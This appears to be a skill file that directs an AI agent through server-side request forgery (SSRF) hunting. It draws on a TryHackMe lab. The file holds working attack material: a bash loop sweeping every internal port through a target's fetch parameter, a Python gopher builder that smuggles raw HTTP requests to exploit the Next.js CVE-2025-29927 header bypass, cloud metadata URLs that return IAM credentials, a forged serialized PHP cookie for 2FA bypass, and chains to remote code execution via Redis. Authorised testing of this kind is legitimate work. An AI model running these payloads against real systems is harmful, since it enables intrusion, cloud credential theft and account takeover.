---
name: hunt-ssrf
description: SSRF hunting - OOB-mandatory methodology. Cloud metadata, blind SSRF via Collaborator/interactsh, redirect-based bypass, headless browser chains. Wiki-first, FIND schema output.
---

# Hunt: SSRF

## Pre-Attack: Wiki Query (MANDATORY)
```
qmd_query "SSRF server-side request forgery" via wiki-search MCP -> read matching technique page if found.
```
Apply known payloads, bypass variants, and cloud metadata endpoints already documented.


**Self-heal:** If the wiki query returns nothing, create a stub `wiki/techniques/<area>/<slug>.md` (frontmatter + a `## Observed during <engagement>` section built from your findings) before proceeding, so the gap fills instead of silently recurring.

## Scope Check
- Confirm target is in scope
- Read Deadends.md - skip paths already marked exhausted

## OOB Gate (Read First)
**Blind SSRF claims require OOB confirmation. No exceptions.**

NOT confirmation: URL echo in error message, different status code, delayed response alone.
IS confirmation: DNS lookup or HTTP request to your unique Collaborator/interactsh subdomain.

When you plant a blind/OOB SSRF payload, append a row to `targets/<eng>/oob.md`: `| <token> | <sink url+param> | ssrf | <date> | waiting | |` (columns: token | sink | class | planted | status | source, where token = your unique Collaborator/interactsh label). The recon-capture hook auto-correlates incoming callbacks to flip the row to HIT and SessionStart surfaces HITs; a HIT row is the confirmation gate to scaffold the FIND. Do NOT claim a blind SSRF without a HIT row.

Setup OOB before testing (full channel guide: wiki `oob-callbacks` - DNS-vs-HTTP, self-hosted interactsh, DNS exfil):
```bash
interactsh-client -v   # or use Burp Collaborator
# Tag each sink: dlsrcurl.<collab>, import.<collab>, webhook.<collab>
```

## Attack Surface Signals
URL patterns:
```
?url=  ?uri=  ?src=  ?source=  ?feed=  ?host=  ?target=  ?dest=
?redirect=  ?callback=  ?image=  ?fetch=  ?load=  ?endpoint=
/api/*/preview  /api/*/fetch  /api/*/import  /api/*/webhook  /api/*/render
```

High-value tech: Kubernetes (internal API), GCP/AWS/Azure (metadata), headless browsers (PDF/screenshot), link-preview features, file-import pipelines.

## Once outbound is confirmed: ENUMERATE INTERNAL FIRST (do not skip)
An internal-only service is the usual SSRF objective and it is **invisible to your external nmap**,
so the SSRF is your only scanner. Before grinding cloud metadata or filter bypasses, sweep
`127.0.0.1` ports THROUGH the sink and fingerprint everything that answers:
```bash
T=<target>
# non-empty / distinct body = open. Sweep the FULL range, not a "common ports" shortlist. Thread it.
for P in $(seq 1 65535); do R=$(curl -s -m3 "http://$T/preview.php?url=http://127.0.0.1:$P/"); [ -n "$R" ] && echo "OPEN $P len=${#R}"; done
```
- **Sweep wide.** "Common ports only" misses the box: THM Extract hid its objective (a Next.js app)
  on internal **:10000**. Threaded drop-in + curated high-value ports in [[wiki/payloads/ssrf]] payloads.
- **Fingerprint each internal service and run it through `playbook.json` / the matching hunt skill
  exactly as if it were external** (`<title>`, `Server` / `x-powered-by`, `/_next/static` ->
  Next.js -> CVE-2025-29927, `/solr`, `/actuator`, Jenkins, GitLab...). recon-capture only
  fingerprints EXTERNAL tool output, so an SSRF-discovered app will NOT auto-fire the playbook -
  you must apply it by hand. **This is exactly where internal CVEs get missed.**

## Gopher: send what `?url=` cannot
A plain `?url=` fetch issues a fixed `GET` with no control over method/headers/cookies/body. Many
internal exploits need precisely that control. `gopher://host:port/_<raw-bytes>` makes the sink open
a raw TCP socket and send arbitrary bytes - a full HTTP request you craft:
```python
import urllib.parse, subprocess
T="<target>"
def gopher(raw: bytes, port: int):                       # raw = the complete request you build
    sel=''.join('%%%02X'%b for b in raw)                 # percent-encode bytes -> gopher selector
    g='gopher://127.0.0.1:%d/_%s'%(port, sel)
    return subprocess.run(['curl','-s','-m','10',
        'http://%s/preview.php?url=%s'%(T, urllib.parse.quote(g, safe=''))],   # encode again for ?url=
        capture_output=True).stdout
req=b'GET /admin HTTP/1.1\r\nHost: 127.0.0.1\r\nx-middleware-subrequest: middleware\r\nConnection: close\r\n\r\n'
```
Unlocks: **custom headers for header-based CVEs** (Next.js CVE-2025-29927 `x-middleware-subrequest`),
**HTTP Basic auth** (`Authorization: Basic`), **POST logins**, **forged cookies** (serialized-object
/ JWT swaps), and raw protocols (Redis / FastCGI / SMTP). Full `send(method,path,headers,cookie,body)`
builder in [[wiki/payloads/ssrf]] payloads. Gopher cannot read files - it is for TCP services, not `file://`.

## Methodology
1. Map all URL-input parameters across the target
2. Set up OOB listener, sub-tag per sink
3. Send callback URL as parameter value first - confirm server makes outbound connection
4. Test cloud metadata:
```bash
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP (requires Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```
5. Internal services: **sweep the FULL port range via the sink** (see "ENUMERATE INTERNAL FIRST"
   above), not just these known ones:
```bash
http://127.0.0.1:6443/api/v1/namespaces    # Kubernetes API
http://127.0.0.1:2379/v2/keys              # etcd
http://127.0.0.1:9200/                     # Elasticsearch
http://127.0.0.1:9090/                     # Prometheus
http://127.0.0.1:{3000,5000,8000,8080,8888,9000,10000}/   # app/admin ports - where the objective usually hides
```
6. Test redirect-based SSRF (host redirect server pointing to internal addresses)
7. Test headless browser contexts - inject `<script>fetch(...)` for PDF/screenshot endpoints
8. Chain: SSRF -> cloud creds -> account takeover; SSRF -> Redis/memcached -> RCE
9. **Distill to wiki (when confirmed):** if the finding is a reusable cloud bypass or SSRF chain, stage a GENERIC wiki candidate now (no client host): `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/ssrf.md`. Promote later via `scripts/wiki-promote.py`.

## Lessons (THM Extract)
- The objective (a Next.js app) sat on internal **:10000**, reachable ONLY via the SSRF. A
  full-range internal sweep found it; a "common ports" pass did not. **Sweep wide, sweep early.**
- The win was a **header** (`x-middleware-subrequest`) a `?url=` GET can't set -> delivered over
  **gopher**. When a known CVE needs a specific header/method/cookie, reach for the gopher builder,
  not a fancier `?url=` value.
- An SSRF-reachable internal admin (localhost-only `/management`, Apache `Require ip`) **is in
  scope**: HTTP Basic auth, a POST login, and a **forged serialized-object cookie** (PHP
  `O:9:"AuthToken":...{validated;b:0}` -> flip to `b:1` = 2FA bypass) all rode the one gopher tunnel.
- **server-status / access-log read via SSRF echoes YOUR OWN requests** (gopher = `127.0.0.1`,
  direct hits = your VPN IP). Filter your source IPs before treating a repeated request as a victim
  cron - a phantom "cron" here was self-induced and burned time.
- File read stayed blocked (`file://` / `php://` / `data://` keyword-filtered, case-insensitive)
  and the chain needed none. Don't grind source disclosure the chain doesn't require.

## FIND Output

If finding confirmed (OOB callback received):
```
Create Vulns/Research/FIND-XXX-HIGH-ssrf-<host>.md
Add row to Vuln-index.md: | FIND-XXX | SSRF on host:port | host:port | PARTIAL |
Severity: CRITICAL if cloud metadata creds retrieved; HIGH if internal service access; MEDIUM if DNS-only OOB
```

If path exhausted (38+ payloads, zero OOB callbacks):
```
Append to Deadends.md: - [ ] SSRF on <host> param <param> -- zero OOB callbacks, URL echo only (server-side URL validation, not fetching)
```

Report: Status + files created.
